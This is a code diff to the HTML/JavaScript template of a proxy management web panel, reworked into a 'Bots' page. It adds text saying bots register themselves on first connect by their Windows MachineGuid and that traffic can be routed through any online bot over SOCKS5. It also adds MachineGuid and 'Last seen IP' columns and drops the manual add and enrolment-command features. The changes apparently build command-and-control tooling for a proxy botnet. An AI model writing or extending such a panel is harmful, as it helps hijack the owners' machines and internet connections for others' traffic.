@@ -4,18 +4,9 @@
             <div class="ibox float-e-margins">
                 <div class="ibox-title">
                     <h5>Bots</h5>
+                    <small class="text-muted m-l-md">Bots register themselves on first connect by their MachineGuid. Use the SOCKS5 link to route traffic through any online bot.</small>
                 </div>
                 <div class="content">
-                {{if eq true .isAdmin}}
-                    <div class="table-responsive">
-                        <div id="toolbar">
-                            <a class="btn btn-primary dim" onclick="addBot()">
-                                <i class="fa fa-fw fa-lg fa-plus"></i> Add bot
-                            </a>
-                        </div>
-                        <table id="taskList_table" class="table-striped table-hover" data-mobile-responsive="true"></table>
-                    </div>
-                {{end}}
                     <div class="ibox-content">
                         <table id="table"></table>
                     </div>
@@ -49,37 +40,6 @@
         $tmp.remove();
     }
 
-    function addBot() {
-        var remark = prompt('Remark for the new bot (optional)', '');
-        if (remark === null) return;
-        $.ajax({
-            type: 'POST',
-            url: '{{.web_base_url}}/client/add',
-            data: { remark: remark },
-            success: function (res) {
-                alert(res.msg);
-                if (res.status) {
-                    $('#table').bootstrapTable('refresh');
-                }
-            }
-        });
-    }
-
-    function regenerate(id) {
-        if (!confirm('Generate a new SOCKS5 username and password for this bot?')) return;
-        $.ajax({
-            type: 'POST',
-            url: '{{.web_base_url}}/client/regenerate',
-            data: { id: id },
-            success: function (res) {
-                alert(res.msg);
-                if (res.status) {
-                    $('#table').bootstrapTable('refresh');
-                }
-            }
-        });
-    }
-
     function editRemark(id, current) {
         var remark = prompt('Edit remark', current || '');
         if (remark === null) return;
@@ -98,7 +58,6 @@
 
     /* bootstrap table */
     $('#table').bootstrapTable({
-        toolbar: '#toolbar',
         method: 'post',
         url: '{{.web_base_url}}/client/list',
         contentType: 'application/x-www-form-urlencoded',
@@ -127,8 +86,18 @@
                 formatter: function (value) { return value || '<span class="text-muted">-</span>'; }
             },
             {
+                field: 'MachineGuid',
+                title: 'MachineGuid',
+                halign: 'center',
+                visible: true,
+                formatter: function (value) {
+                    if (!value) return '<span class="text-muted">-</span>';
+                    return '<code title="' + value + '">' + value.substr(0, 8) + '…</code>';
+                }
+            },
+            {
                 field: 'Addr',
-                title: 'Address',
+                title: 'Last seen IP',
                 halign: 'center',
                 visible: true,
                 formatter: function (value) { return value || '<span class="text-muted">-</span>'; }
@@ -169,7 +138,6 @@
                 formatter: function (value, row) {
                     var btn = '<div class="btn-group">';
                     btn += '<a onclick="editRemark(' + row.Id + ', \'' + (row.Remark || '').replace(/'/g, '&#39;') + '\')" class="btn btn-outline btn-success" title="Edit remark"><i class="fa fa-edit"></i></a>';
-                    btn += '<a onclick="regenerate(' + row.Id + ')" class="btn btn-outline btn-primary" title="Regenerate SOCKS5 credentials"><i class="fa fa-sync-alt"></i></a>';
                     if (row.Status) {
                         btn += '<a onclick="submitform(\'stop\', \'{{.web_base_url}}/client/changestatus\', {\'id\':' + row.Id + ', \'status\': 0})" class="btn btn-outline btn-warning" title="Disable"><i class="fa fa-pause"></i></a>';
                     } else {
@@ -179,20 +147,7 @@
                     btn += '</div>';
                     return btn;
                 }
-            },
-            {
-                field: 'cmd',
-                title: 'NPC command',
-                halign: 'center',
-                visible: false,
-                formatter: function (value, row) {
-                    var cmd = './npc{{.win}} -server={{.ip}}:{{.p}} -vkey=' + row.VerifyKey + ' -type=' + '{{.bridgeType}}';
-                    return '<code>' + cmd + '</code>';
-                }
             }
         ]
     });
-
-    /* The bootstrap-table English locale renames the search/columns
-       buttons but our minimal layout fits everything we need. */
 </script>
